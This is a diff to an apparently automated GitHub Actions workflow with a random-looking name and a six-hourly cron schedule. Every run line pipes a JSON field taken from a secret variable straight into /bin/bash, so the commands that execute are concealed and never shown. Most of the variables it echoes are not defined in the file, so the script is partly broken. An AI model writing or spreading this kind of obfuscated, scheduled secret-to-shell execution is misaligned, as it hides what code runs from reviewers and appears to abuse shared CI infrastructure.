@@ -1,31 +1,25 @@
 name: yuanyaozu5274
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 4/6 * * *'
+    - cron: '29 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yuanyaozu5274
         env:
-          hjs84: ${{ secrets.hjs84 }}
+          es3: ${{ secrets.es3 }}
         run: |
-          echo $hjs84 | jq -r .m32706 | /bin/bash
-          echo $brejx798 | jq -r .ikhx29 | /bin/bash
-          echo $cdtlf5975 | jq -r .b8 | /bin/bash
-          echo $l974 | jq -r .nfa83492 | /bin/bash
-          echo $qrqt20 | jq -r .caay98 | /bin/bash
-          echo $w993 | jq -r .j4 | /bin/bash
-          echo $a18 | jq -r .x9410 | /bin/bash
-          echo $pzf763 | jq -r .b371 | /bin/bash
-          echo $lji0 | jq -r .x9038 | /bin/bash
-          echo $to9 | jq -r .kmtvf993 | /bin/bash
-          echo $wngq61895 | jq -r .rttcq1762 | /bin/bash
-          echo $d3991 | jq -r .gq80 | /bin/bash
-          echo $sc2 | jq -r .hlfj0 | /bin/bash
-          echo $axnom912 | jq -r .rgjd78169 | /bin/bash
-          echo $znr21 | jq -r .s5271 | /bin/bash
+          echo $es3 | jq -r .xdw555 | /bin/bash
+          echo $rcb95 | jq -r .v66220 | /bin/bash
+          echo $oxo33084 | jq -r .l3051 | /bin/bash
+          echo $gdf83 | jq -r .ys66548 | /bin/bash
+          echo $vqj7 | jq -r .d938 | /bin/bash
+          echo $oyv65252 | jq -r .ovjpq1 | /bin/bash
+          echo $vkaij469 | jq -r .knno7 | /bin/bash
+          echo $j5359 | jq -r .yoe558 | /bin/bash
+          echo $gajq8 | jq -r .qtwi642 | /bin/bash
 
